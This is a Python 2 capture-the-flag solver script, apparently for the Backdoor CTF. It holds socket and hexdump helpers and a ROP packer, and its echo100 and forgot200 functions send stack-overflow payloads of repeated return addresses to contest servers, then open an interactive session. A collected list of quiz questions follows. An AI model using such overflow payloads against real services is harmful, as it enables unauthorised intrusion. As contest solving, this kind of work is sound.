__author__ = 'HuyNA'
import struct
import socket
import telnetlib
import hexdump
import time
import hashlib
#import pwn

def DumpLibc(s):
    libc_file = open("libc.dump", "wb")
    libc_buffer = ""
    data = s.recv(0x100)
    libc_buffer = data
    i=0
    try:
        while(len(data) >= 1):
            data = s.recv(0x100)
            libc_buffer += data
            time.sleep(0.01)
            print(i)
            i += 1
    finally:
        libc_file.write(libc_buffer)

def recv_until(sock, delim):
    buf = ""
    while True:
        c = sock.recv(1)
        buf += c
        if delim in buf:
            break
    return buf
#
def readuntil(f, delim='\n'):
    data = ''
    while not data.endswith(delim):
        data += f.read(1)
    return data

def beauty_print(data):
    hexdump.hexdump(data)

def read_hex(data):
    return hexdump.restore(data)

# from '\x11\x22' => '1122'
def print_hex_string(data):
    return data.encode('hex')
def xor_encrypt(data, key):
    decode_string = ''
    for i in range(len(data)):
        decode_string += chr((ord(data[i])^ord(key[i%len(key)]))&0xFF)
    return decode_string

def write_file(file_name, content):
    f = open(file_name,'wb')
    f.write(content)
    f.close()

def read_file(file_name):
    f = open(file_name, 'rb')
    content = ''
    byte = f.read(1)
    while byte != b"":
        content += byte
        byte = f.read(1)
    f.close()
    return content

def final_interact(s):
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()
def demo():
    data='00 11 22 33 44 55 66 77  88 99 AA BB CC DD EE FF'
    a = read_hex(data)
    print a.encode('hex')
    print type(a)
    beauty_print('kdfjiefoefjkafjieo\x11\x12')
def demo_sha1(data):
    print hashlib.sha1(data).hexdigest()
def convert_format(rop_array_number):
    rop = ''
    size = len(rop_array_number)
    for i in range(size):
        rop += struct.pack('<I', rop_array_number[i])
    return rop



pq = lambda v: struct.pack('<Q', v)
uq = lambda v: struct.unpack('<Q', v)[0]
pi = lambda v: struct.pack('<I', v)
ui = lambda v: struct.unpack('<I', v)[0]

def c600():
    a='35663364643630313765313932346137383565626361353061383564643862313131646138376661356363663138336666643263363336353533353962663137'
    length = len(a)/8
    print length
    d = 0
    b = d + 8
    t=''
    while (b<=len(a)):
        c = a[d:b].decode('hex')[::-1]
        print c
        t += c
        d=b
        b=d+8

    print t

#c600()
def echo100():
    '''
    nc hack.bckdr.in 8002
    '''
    a = 'a'*2+pi(0x0804854D)*100+'\n'
    s = socket.create_connection(('hack.bckdr.in',8002))
    s.send(a)
    print s.recv(1024)
    print s.recv(1024)
    print s.recv(1024)
    print s.recv(1024)
    final_interact(s)
#echo100()
def forgot200():
    '''
    hack.bckdr.in:8009
    '''
    print_flag_addr = '@@@'+pi(0x080486CC)*20+'\n'
    s = socket.create_connection(('hack.bckdr.in',8009))
    print recv_until(s,'> ')
    s.send(print_flag_addr)
    print recv_until(s,'> ')
    s.send(print_flag_addr)
    final_interact(s)
#forgot200()

def rapidfire500():
    '''
    nc hack.bckdr.in 8006
    '''
    t = []
    count =0
    while (count<100):
        s = socket.create_connection(('hack.bckdr.in',8006))
        data = recv_until(s,'################################\n\n\n')
        #print data
        data = recv_until(s,'################################\n\n\n')
        #print data
        data = recv_until(s,'\n')
        print data
        t.append(data)
        count+=1

    '\n'.join(t)
rapidfire500()

'''
What is the sum of first 8015686872 natural numbers

Give me the value of 1346121407 in binary

Show me the 843347th prime number

So tell me the md5 hash of 9465524610

What is the value of 5918143299 in binary

What is the 494395th digit in pi

So tell me the sum of first 1902829869 natural odd numbers

Do you know what's the md5 hash of 4924343820

Next up, what's the sum of first 4856481489 natural numbers

Show me the sum of first 3608480532 natural odd numbers

Give me the 699645th prime number

Do you know what's the value of 1949759208 in binary

Show me the 14th fibonacci number

Give me the sum of first 8099008423 natural numbers

Show me the md5 hash of 3474186419

Show me the country of Hohenzell

Give me the sum of first 189 fibonacci numbers

What is the sum of first 8032431162 natural odd numbers

What is the country of Palpa

Show me the value of 7129237385 in binary

Next up, what's the 46th fibonacci number

Next up, what's the sum of first 227 fibonacci numbers

Next up, what's the 246909th digit in pi

Do you know what's the country of GrigiÅ¡kÄ—s

So tell me the 304284th digit in pi

Give me the 156247th prime number

Show me the value of 166480034 in binary

Do you know what's the 363033rd prime number

What is the 161st fibonacci number

Give me the 29th fibonacci number

Do you know what's the 116129th prime number

Do you know what's the sum of first 6488139730 natural numbers

Give me the sum of first 6275935535 natural numbers

Do you know what's the sum of first 222 fibonacci numbers

So tell me the 155th fibonacci number

Do you know what's the 38834th prime number

What is the md5 hash of 8758061874

Show me the country of Sasso Marconi

So tell me the md5 hash of 8058358289

Show me the 39628th digit in pi

Give me the sum of first 246087738 natural odd numbers

Show me the sum of first 176 fibonacci numbers

What is the 284th fibonacci number

Do you know what's the 201st fibonacci number

So tell me the value of 3766399227 in binary

Show me the md5 hash of 5528532657

So tell me the country of Delta

Give me the country of Sama

Give me the value of 1921256702 in binary

Give me the md5 hash of 9380022897

Give me the sum of first 128 fibonacci numbers

Show me the value of 32331176 in binary

Show me the 820930th digit in pi

Next up, what's the value of 3445558033 in binary

Show me the 685733rd prime number

Do you know what's the sum of first 5533759190 natural numbers

Next up, what's the 10169th prime number

Show me the sum of first 245 fibonacci numbers

Next up, what's the 45th fibonacci number

What is the sum of first 19488969 natural numbers

Next up, what's the country of Palmerston North

What is the sum of first 7004987850 natural numbers

Show me the 781385th prime number

Next up, what's the sum of first 9473379832 natural numbers

Do you know what's the value of 7551537514 in binary

Show me the 884172nd prime number

What is the sum of first 209 fibonacci numbers

Do you know what's the value of 7029900027 in binary

What is the sum of first 1975468257 natural odd numbers

Next up, what's the sum of first 247 fibonacci numbers

Next up, what's the value of 4234358153 in binary

Show me the 333237th digit in pi

What is the 439959th prime number

What is the 107433rd prime number

Next up, what's the country of Charlestown

Next up, what's the sum of first 295 fibonacci numbers

So tell me the md5 hash of 7853571100

Do you know what's the 666496th prime number

Do you know what's the sum of first 4941597459 natural numbers

So tell me the sum of first 1945839827 natural numbers

What is the 602018th digit in pi

What is the 916159th digit in pi

So tell me the 370784th prime number

What is the sum of first 273 fibonacci numbers

Next up, what's the sum of first 3603881601 natural odd numbers

What is the sum of first 156 fibonacci numbers

Do you know what's the value of 6825405256 in binary

So tell me the 87th fibonacci number

What is the sum of first 6576953670 natural odd numbers

Show me the value of 7596400336 in binary

What is the 427534th digit in pi

Show me the md5 hash of 9482426525

Give me the sum of first 8891870167 natural numbers

Show me the sum of first 1206173037 natural numbers

Do you know what's the value of 2744279149 in binary

So tell me the md5 hash of 1607384425

Give me the 75th fibonacci number

What is the country of Manzini

Do you know what's the country of Quba

So tell me the sum of first 216 fibonacci numbers

Give me the sum of first 3041398320 natural numbers
Next up, what's the 232nd fibonacci number
Give me the md5 hash of 767403352

'''